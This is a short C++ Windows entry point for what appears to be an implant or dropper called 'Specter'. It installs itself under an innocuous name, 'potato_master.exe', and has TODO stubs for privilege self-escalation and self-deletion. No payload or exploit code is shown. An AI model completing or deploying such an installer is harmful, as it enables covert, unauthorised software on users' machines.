#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "SpecterBasicDeployment.hpp"
#include "SpecterLib/SelfProcessUtils.hpp"


int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int)
{
	static const std::wstring kProgramName = L"potato_master";
	static const std::wstring kProgramPath = kProgramName + L".exe";

	if (SelfProcessUtils::IsProcessElevated())
	{
		// TODO Admin Install Mode and then Exit
	}
	else if (false) // Attempt self escalation if not already attempted once
	{
		// TODO Self Escalation Code
		// Run self with priveleges
		// If successful, exit, if failed, continue to basic deployment
	}

	// Deploy as normal user
	SpecterBasicDeployment deployement(kProgramName, kProgramPath);

	if (!deployement.IsInstalled())
	{
		deployement.Install();
	}

	// TODO Delete Self code ?

	return 0;
}
